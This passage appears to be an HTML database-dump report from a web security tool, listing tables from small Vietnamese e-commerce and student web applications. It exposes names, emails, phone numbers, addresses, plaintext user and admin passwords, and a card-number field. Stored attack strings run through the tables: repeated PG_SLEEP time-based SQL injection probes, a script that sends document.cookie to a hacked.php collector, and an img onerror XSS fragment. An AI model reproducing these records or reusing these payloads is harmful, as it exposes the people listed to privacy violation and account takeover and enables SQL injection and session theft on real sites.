Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n&lt;/p&gt;</td><td>Blad3</td></tr><tr><td>3</td><td>&lt;p&gt;\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n&lt;/p&gt;\n&lt;p&gt;\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n&lt;/p&gt;</td><td>lyzae</td></tr><tr></tr></table><br>
+<h4>Table: featured (1 rows)</h4>
+<table>
+<tr>
+<th>pic_id</th><th>feature_text</th></tr><tr></tr></table><br>
+<h4>Table: users (2 rows)</h4>
+<table>
+<tr>
+<th>cc</th><th>cart</th><th>pass</th><th>email</th><th>phone</th><th>uname</th><th>name</th><th>address</th></tr><tr><td>67676767676969691</td><td>2a8bad9c33b30d84b464ae4470a0a11e</td><td>test</td><td>67@69.lul</td><td>69-6767-420</td><td>test</td><td>Your Mom</td><td>2121</td></tr><tr></tr></table><br><h3>Database: db_thoitrang</h3>
+<h4>Table: product (30 rows)</h4>
+<table>
+<tr>
+<th>idProduct</th><th>idCategory</th><th>day</th><th>image</th><th>price</th><th>quantity</th><th>product_name</th><th>description</th></tr><tr><td>3</td><td>1</td><td>20/10/2019</td><td>somi(1).jpg</td><td>499.000 VND</td><td>10</td><td>Áo sơ mi</td><td>Dáng thông thường(regular)\r\nCó mũ, tay dài</td></tr><tr><td>4</td><td>1</td><td>28/10/2019</td><td>somi(2).jpg</td><td>599.000 VND</td><td>5</td><td>Áo sơ mi</td><td>Dáng thông thường(regular)\r\nCó mũ, tay dài</td></tr><tr><td>5</td><td>1</td><td>20/10/2019</td><td>somi(3).jpg</td><td>300.000 VND</td><td>14</td><td>Áo sơ mi nam dài tay kẻ caro</td><td>Áo sơ mi Cotton USA kẻ caro.\r\nPhom dáng regular, cổ đức, tay dài, có cúc cài trang trí ở lá cổ.\r\nPhù hợp mặc quanh năm. Mặc thoải mái, dễ chịu có thể kết hợp với quần jeans, khaki.</td></tr><tr><td>6</td><td>1</td><td>20/10/2019</td><td>somi(4).jpg</td><td>599.000 VND</td><td>5</td><td>Áo sơ mi nam</td><td>Áo sơ mi bamboo pha kẻ caro.\r\nPhom regular, cổ đức, tay dài.\r\nĐơn giản, lịch sự rất phù hợp mặc nơi công sở. Có thể kết hợp với quần âu, quần khaki, giày tây.</td></tr><tr><td>7</td><td>1</td><td>20/10/2019</td><td>somi(5).jpg</td><td>300.000 VND</td><td>12</td><td>Áo sơ mi nam</td><td>Áo sơ mi denim cotton họa tiết kẻ sọc.\r\nPhom regular, cổ đức, tay dài.\r\nCó túi ngực, cài cúc phía trước.\r\nThích hợp mặc quanh năm. Kiểu dáng đơn giản, lịch sự phù hợp nhiều hoàn cảnh.\r\nCó thể phối với nhiều dáng quần: quần jeans, khak, giày lười, giày tây</td></tr><tr><td>8</td><td>1</td><td>20/10/2019</td><td>somi(6).jpg</td><td>599.000 VND</td><td>20</td><td>Áo sơ mi nam</td><td>Áo sơ mi cotton kẻ caro.\r\nPhom regular, cổ đức, tay dài.\r\nDòng hàng cơ bản bắt buộc có trong mùa.</td></tr><tr><td>9</td><td>1</td><td>20/10/2019</td><td>somi(7).jpg</td><td>200.000 VND</td><td>12</td><td>Áo sơ mi nam</td><td>Áo sơ mi nam</td></tr><tr><td>10</td><td>1</td><td>20/10/2019</td><td>somi(8).jpg</td><td>215.000 VND</td><td>17</td><td>Áo sơ mi nam ngắn tay</td><td>Áo sơ mi nam ngắn tay in họa tiết nằm trong bộ sưu tập JOURNEY TO THE EAST\r\nChất liệu linen đặc biệt mềm mại, thoáng mát\r\nVới đặc tính sợi vải không xô dạt, không phai màu nên càng sử dụng lâu, linen càng mềm mại và êm ái hơn\r\n</td></tr><tr><td>11</td><td>2</td><td>20/10/2019</td><td>aokhoac(1).jpg</td><td>400.000 VND</td><td>10</td><td>Áo khoác</td><td>Áo khoác nam đen</td></tr><tr><td>12</td><td>2</td><td>20/10/2019</td><td>aokhoac(2).jpg</td><td>300.000 VND</td><td>5</td><td>Áo khoác nam</td><td>Áo khoác nam</td></tr><tr><td>13</td><td>2</td><td>20/10/2019</td><td>aokhoac(3).jpg</td><td>500.000 VND</td><td>9</td><td>Áo khoác nam</td><td>Dáng thông thường (Regular)\r\nCHẤT LIỆU\r\n100%cotton\r\nGiặt máy ở chế độ nhẹ nhàng, nhiệt độ thông thường\r\nSử dụng hóa chất tẩy không có chất Clo\r\nSấy khô ở nhiệt độ thấp 110°, là ở nhiệt độ trung bình 150°\r\nGiặt với sản phẩm cùng màu\r\nNên phơi vắt ngang</td></tr><tr><td>14</td><td>2</td><td>20/10/2019</td><td>aokhoac(4).jpg</td><td>400.000 VND</td><td>17</td><td>Áo khoác nam</td><td>Dáng thông thường (Regular)\r\nCHẤT LIỆU\r\n80% Cotton, 13% Polyester 2% Spandex 5% Latex\r\nGiặt máy ở chế độ nhẹ, nhiệt độ thường\r\nKhông sử dụng hóa chất tẩy có chứa Clo\r\nPhơi trong bóng mát\r\nKhông được sấy, không được là\r\nKhông được giặt khô\r\nGiặt với sản phẩm cùng màu</td></tr><tr><td>15</td><td>2</td><td>20/10/2019</td><td>aokhoac(5).jpg</td><td>500.000 VND</td><td>13</td><td>Áo khoác nam</td><td>Dáng thông thường (regular)\r\nSản phẩm có tính năng chống thấm nước\r\nCHẤT LIỆU\r\n100% polyester\r\nGiặt máy nhẹ nhàng, ở nhiệt độ thường\r\nKhông sử dụng hóa chất tẩy\r\nSấy khô nhẹ nhàng, là ở nhiệt độ trung bình 150 độ C\r\nGiặt với sản phẩm cùng màu</td></tr><tr><td>16</td><td>3</td><td>20/10/2019</td><td>aolen(1).jpg</td><td>400.000 VND</td><td>12</td><td>ÁO GHILE LEN LÔNG CỪU NAM</td><td>Dáng thường (regular)\r\nCHẤT LIỆU\r\n100% Wool\r\nGiặt tay ở nhiệt độ thường, không sử dụng chất tẩy\r\nGiặt mặt trái sản phẩm, phơi phẳng trong bóng mát\r\nKhông được sấy, là nhiệt độ 110 độ C\r\nGiặt với sản phẩm cùng màu</td></tr><tr><td>17</td><td>3</td><td>20/10/2019</td><td>aolen(2).jpg</td><td>599.000 VND</td><td>12</td><td>ÁO LEN NAM MỎNG CỔ TRÒN DÀI TAY</td><td>Áo len nam trơn màu\r\nThiết kế cổ tròn, tay và gấu bo gọn gàng\r\nChất liệu mềm mại, ấm áp, không gây tích điện\r\nCHẤT LIỆU\r\n100% Cotton\r\nGiặt máy nhẹ nhàng, ở nhiệt độ thường\r\nKhông sử dụng hóa chất tẩy\r\nSấy khô nhẹ nhàng, là ở nhiệt độ trung bình 150 độ C\r\nGiặt với sản phẩm cùng màu</td></tr><tr><td>18</td><td>3</td><td>20/10/2019</td><td>aolen(3).jpg</td><td>600.000 VND</td><td>9</td><td>Áo len nam dài tay cổ tròn</td><td>Áo len nam dệt quả trám\r\nThiết kế cổ tròn, tay và gấu bo gọn gàng\r\nChất liệu mềm mại, ấm áp, không gây tích điện\r\nThông tin người mẫu: 1m82 &amp; 72kg – Size quần 31, size áo: M\r\nCHẤT LIỆU\r\n100% Acrylic\r\nĐể sản phẩm nơi khô ráo\r\nTránh tiếp xúc trực tiếp với ánh nắng mặt trời và nhiệt độ cao\r\nTránh để bề mặt sản phẩm tiếp xúc với các vật sắc nhọn</td></tr><tr><td>19</td><td>3</td><td>20/10/2019</td><td>somi(4).jpg</td><td>450.000 VND</td><td>5</td><td>Áo len nam dài tay cổ tròn</td><td>Áo sơ mi dày cổ tròn dài tay</td></tr><tr><td>20</td><td>4</td><td>20/10/2019</td><td>aochuidau(1).jpg</td><td>125.000 VND</td><td>12</td><td>Áo chui dầu dài tay</td><td> Áo chui đầu tay dài, cổ tròn</td></tr><tr><td>21</td><td>4</td><td>20/10/2019</td><td>aochuidau(2).jpg</td><td>449.000 VND</td><td>12</td><td>ÁO HOODIES NAM</td><td>Áo hoodies nam dáng regular\r\nCó mũ, tay dài, in hình trẻ trung\r\nChất liệu mềm mại, thấm hút mồ hôi,co giãn thoải mái\r\nCHẤT LIỆU\r\n64% Polyester 34%cotton 2% spandex\r\nGiặt máy nhẹ nhàng, ở nhiệt độ thường\r\nKhông sử dụng hóa chất tẩy\r\nSấy khô nhẹ nhàng, là ở nhiệt độ trung bình 150 độ C\r\nGiặt với sản phẩm cùng màu</td></tr><tr><td>22</td><td>4</td><td>20/10/2019</td><td>aochuidau(3).jpg</td><td>399.000 VND</td><td>9</td><td>Áo nỉ chui đầu nam in hình</td><td>Áo nỉ</td></tr><tr><td>23</td><td>6</td><td>20/10/2019</td><td>aophong(1).jpg</td><td>120.000 VND</td><td>7</td><td>Áo phông dài tay</td><td>Áo thun nam dáng regular, cổ tròn, tay dài, in hình trước ngực\r\nChất liệu mềm mại, co giãn, thấm hút mồ hôi tốt, ít co ngót, bền bỉ theo năm tháng\r\nVải có nguồn gốc là Cotton US, được kiểm soát bởi hiệp hội bông US uy tín, đặc biệt khả năng truy xuất nguồn gốc đáng tin cậy nhất trong các loại bông</td></tr><tr><td>24</td><td>6</td><td>20/10/2019</td><td>aophong(2).jpg</td><td>150.000 VND</td><td>5</td><td>Áo phông nam tay dài in hình mickey</td><td>Áo thun nam nằm trong bộ sưu tập Disney-Mickey\r\nDáng áo regular, cổ tròn, tay dài, in hình Mickey\r\nChất liệu Cotton US mềm mại, co giãn, thấm hút mồ hôi tốt\r\nChất liệu ít co ngót, bền bỉ theo năm tháng\r\nVải có nguồn gốc là Cotton US, được kiểm soát bởi hiệp hội bông US uy tín, đặc biệt khả năng truy xuất nguồn gốc đáng tin cậy nhất trong các loại bông</td></tr><tr><td>25</td><td>6</td><td>20/10/2019</td><td>aophong(3).jpg</td><td>200.000 VND</td><td>7</td><td>Áo phông ngắn tay</td><td> Áo phông ngắn tay</td></tr><tr><td>26</td><td>7</td><td>20/10/2019</td><td>quanjean(1).jpg</td><td>500.000 VND</td><td>10</td><td>Quần jean</td><td>Quần jeans Cotton USA.\r\nForm Regular, cạp thường, 5 túi .\r\nCái khoá trước, khuy kim loại.\r\nPhù hợp mặc quanh năm, có thể kết hợp với áo sơ mi, polo, T-shirt, áo len</td></tr><tr><td>27</td><td>7</td><td>20/10/2019</td><td>quanjean(2).jpg</td><td>600.000 VND</td><td>8</td><td>Quần jean nam</td><td>Quần jeans cotton co giãn.\r\nPhom slim, cạp thường, 5 túi.\r\nCái khoá trước, khuy kim loại.\r\nHiệu ứng chà bạc.\r\nPhù hợp mặc quanh năm, có thể kết hợp với áo sơ mi, polo, T-shirt, áo len</td></tr><tr><td>28</td><td>7</td><td>20/10/2019</td><td>quanjean(3).jpg</td><td>760.000 VND</td><td>12</td><td>Quần jean nam</td><td>Quần jeans cotton có co giãn.\r\nForm slim, cạp thường, 5 túi.\r\nCái khoá trước, khuy kim loại.\r\nPhù hợp mặc quanh năm, có thể kết hợp với áo sơ mi, polo, T-shirt, áo len</td></tr><tr><td>29</td><td>8</td><td>20/10/2019</td><td>quanvai(1).jpg</td><td>300.000 VND</td><td>7</td><td>Quần vải nam</td><td>Dáng jogger</td></tr><tr><td>30</td><td>8</td><td>20/10/2019</td><td>quanvai(2).jpg</td><td>190.000 VND</td><td>10</td><td>Quần vải nam</td><td>Quần vải nam</td></tr><tr><td>31</td><td>8</td><td>20/10/2019</td><td>quanvai(3).jpg</td><td>200.000 VND</td><td>8</td><td>Quần vải nam</td><td>Quần vải nam</td></tr><tr></tr></table><br>
+<h4>Table: contact (20 rows)</h4>
+<table>
+<tr>
+<th>idContact</th><th>email</th><th>content</th></tr><tr><td>27</td><td>dinhquangduynt@gmail.com</td><td>Shop nhiệt tình, vui vẻ</td></tr><tr><td>28</td><td>nguyenvana@gmail.com</td><td>Sản phẩm chất lượng, hợp túi tiền</td></tr><tr><td>30</td><td>&lt;blank&gt;</td><td>&lt;blank&gt;</td></tr><tr><td>31</td><td>&lt;blank&gt;</td><td>&lt;blank&gt;</td></tr><tr><td>32</td><td>&lt;blank&gt;</td><td>&lt;blank&gt;</td></tr><tr><td>33</td><td>&lt;blank&gt;</td><td>&lt;blank&gt;</td></tr><tr><td>34</td><td>&lt;blank&gt;</td><td>&lt;blank&gt;</td></tr><tr><td>35</td><td>&lt;blank&gt;</td><td>&lt;blank&gt;</td></tr><tr><td>36</td><td>&lt;blank&gt;</td><td>&lt;blank&gt;</td></tr><tr><td>37</td><td>&lt;blank&gt;</td><td>&lt;blank&gt;</td></tr><tr><td>38</td><td>&lt;blank&gt;</td><td>&lt;blank&gt;</td></tr><tr><td>39</td><td>,&lt;blank&gt;
+40, AND (SELECT 5 FROM PG_SLEEP(5)),&lt;blank&gt;
+41,</td><td>&lt;blank&gt;</td></tr><tr><td>42</td><td> AND (SELECT 5 FROM PG_SLEEP(5))</td><td>&lt;blank&gt;</td></tr><tr><td>43</td><td>,&lt;blank&gt;
+44, AND (SELECT 5 FROM PG_SLEEP(5)),&lt;blank&gt;
+45,</td><td>&lt;blank&gt;</td></tr><tr><td>46</td><td> AND (SELECT 5 FROM PG_SLEEP(5))</td><td>&lt;blank&gt;</td></tr><tr><td>47</td><td>,&lt;blank&gt;
+48, AND (SELECT 5 FROM PG_SLEEP(5)),&lt;blank&gt;
+49,</td><td>&lt;blank&gt;</td></tr><tr><td>50</td><td> AND (SELECT 5 FROM PG_SLEEP(5))</td><td>&lt;blank&gt;</td></tr><tr><td>51</td><td>,&lt;blank&gt;
+52, AND (SELECT 5 FROM PG_SLEEP(5)),&lt;blank&gt;
+53,</td><td>&lt;blank&gt;</td></tr><tr><td>54</td><td> AND (SELECT 5 FROM PG_SLEEP(5))</td><td>&lt;blank&gt;</td></tr><tr><td>55</td><td>,&lt;blank&gt;
+56, AND (SELECT 5 FROM PG_SLEEP(5)),&lt;blank&gt;
+
+</td></tr></table><br>
+<h4>Table: invoice (1 rows)</h4>
+<table>
+<tr>
+<th>idIncoice</th><th>address</th><th>status</th><th>name_cus</th><th>phone_number</th></tr><tr></tr></table><br>
+<h4>Table: customer (5 rows)</h4>
+<table>
+<tr>
+<th>idCus</th><th>sex</th><th>email</th><th>name</th><th>address</th><th>password</th><th>username</th><th>phone_number</th></tr><tr><td>1</td><td>\x01</td><td>dinhquangduynt@gmail.com</td><td>đinh quang duy</td><td>nguyễn văn huề, đà nẵng</td><td>quangduy</td><td>quangduy</td><td>0977694163</td></tr><tr><td>2</td><td>\x01</td><td>duypro2603@gmail.com</td><td>Đinh Quang Duy</td><td>nguyễn văn huề đà nẵng</td><td>quanguy</td><td>quangduy98</td><td>0977694163</td></tr><tr><td>3</td><td>\x01</td><td>quangduy</td><td>Đinh Quang Duydd</td><td>aaa</td><td>quangduy</td><td>admin@gmail.com</td><td>aaaa</td></tr><tr><td>5</td><td>\x01</td><td>nttking1@gmail.com</td><td>nttking</td><td>nttking</td><td>nttking</td><td>nttking</td><td>3231</td></tr><tr></tr></table><br>
+<h4>Table: admin (2 rows)</h4>
+<table>
+<tr>
+<th>idAdmin</th><th>password</th><th>username</th></tr><tr><td>1</td><td>admin</td><td>admin</td></tr><tr></tr></table><br>
+<h4>Table: comment (7 rows)</h4>
+<table>
+<tr>
+<th>idComment</th><th>idProduct</th><th>content</th><th>userName</th></tr><tr><td>1</td><td>30</td><td>Sản phẩm đẹp mắt, giá cả phải chăng</td><td>quangduy</td></tr><tr><td>2</td><td>30</td><td>sản phẩm vừa túi tiền</td><td>quangduy98</td></tr><tr><td>3</td><td>30</td><td>đẹp</td><td>quangduy</td></tr><tr><td>5</td><td>31</td><td>đẹp</td><td>quangduy</td></tr><tr><td>8</td><td>26</td><td>&lt;script&gt;document.location=&quot;http://localhost/webdemo/hacked.php?ex=&quot;+document.cookie;&lt;/script&gt; </td><td>nttking</td></tr><tr><td>9</td><td>27</td><td>&lt;script&gt;document.location=&quot;http://localhost/qlthoitrang/hacked.php?ex=&quot;+document.cookie;&lt;/script&gt;</td><td>nttking</td></tr><tr></tr></table><br>
+<h4>Table: invoice_detail (1 rows)</h4>
+<table>
+<tr>
+<th>idInvoice</th><th>idProduct</th><th>price</th><th>quantity</th></tr><tr></tr></table><br>
+<h4>Table: category (8 rows)</h4>
+<table>
+<tr>
+<th>idCategory</th><th>category_name</th></tr><tr><td>1</td><td>Áo sơ mi</td></tr><tr><td>2</td><td>Áo khoác</td></tr><tr><td>3</td><td>Áo len</td></tr><tr><td>4</td><td>Áo chui đầu</td></tr><tr><td>6</td><td>Áo phông</td></tr><tr><td>7</td><td>quần jeans</td></tr><tr><td>8</td><td>Quần vải</td></tr><tr></tr></table><br><h3>Database: db_sinhvien</h3>
+<h4>Table: account (15 rows)</h4>
+<table>
+<tr>
+<th>cusid</th><th>email</th><th>power</th><th>address</th><th>fullname</th><th>password</th><th>username</th><th>phonenumber</th></tr><tr><td>1</td><td>nch@yahoo.com</td><td>admin</td><td>65-Nguyen Qui Duc</td><td>Nguyen Cong Hoang</td><td>admin</td><td>Admin</td><td>0905002124</td></tr><tr><td>3</td><td>linh@yahoo.com</td><td>user</td><td>108 Ho Xuan Huong</td><td>Nguyen Ngoc Linh</td><td>123</td><td>linhlogin</td><td>0906123321</td></tr><tr><td>6</td><td>songa@yahoo.com</td><td>user</td><td>Quang Binh</td><td>Ha Duy Son</td><td>123456</td><td>sonlogin</td><td>0901002003</td></tr><tr><td>7</td><td>123@123</td><td>user</td><td>65nqd</td><td>nchoang</td><td>123456</td><td>hlogion</td><td>012345</td></tr><tr><td>8</td><td>tien@Yahoo.com</td><td>user</td><td>CDCN</td><td>Nguyen Cong Tien</td><td>123456</td><td>tienlogin</td><td>0123123321</td></tr><tr><td>9</td><td>hoang@yahoo.com</td><td>user</td><td>65 NQD</td><td>Nguyen Hoang</td><td>123456</td><td>hoang123login</td><td>0905939390</td></tr><tr><td>10</td><td>123@yahoo</td><td>user</td><td>123</td><td>NK</td><td>123456</td><td>kienlogin</td><td>123123123</td></tr><tr><td>11</td><td>212@ayhoo</td><td>user</td><td>?a</td><td>sda</td><td>123</td><td>dung</td><td>122121</td></tr><tr><td>12</td><td>nttking</td><td>user</td><td>nttking</td><td>nttking</td><td>nttking</td><td>nttking</td><td>313</td></tr><tr><td>13</td><td>test</td><td>user</td><td>test</td><td>,test,test,test
+25,test,user,test,test,test,</td><td>test</td></tr><tr><td>26</td><td>test</td><td>user</td><td>test</td><td>test</td><td>test</td><td>1</td><td>test</td></tr><tr><td>27</td><td>test</td><td>user</td><td>test</td><td>test</td><td>test</td><td>&quot;&gt;&lt;img src=x onerror=aler</td><td>test</td></tr><tr><td>39</td><td>&lt;blank&gt;</td><td>user</td><td>&lt;blank&gt;</td><td>&lt;blank&gt;</td><td>&lt;blank&gt;</td><td>&lt;blank&gt;</td><td>&lt;blank&gt;</td></tr><tr><td>101</td><td>test</td><td>user</td><td>test</td><td>test</td><td>test</td><td> AND (SELECT 5 FROM PG_SL</td><td>test</td></tr><tr></tr></table><br>
+<h4>Table: catid (3 rows)</h4>
+<table>
+<tr>
+<th>catid</th><th>cat</th></tr><tr><td>1</td><td>Thông báo</td></tr><tr><td>2</td><td>Tin T?c</td></tr><tr></tr></table><br>
+<h4>Table: text (1 rows)</h4>
+<table>
+<tr>
+<th>catid</th><th>textid</th><th>title</th><th>bydate</th><th>content</th><th>username</th></tr><tr></tr></table><br>
+<div class="footer">
+    Generated by Ethical Web Security Suite<br>
+    © 2025
+</div>
+
+</body>
+</html>
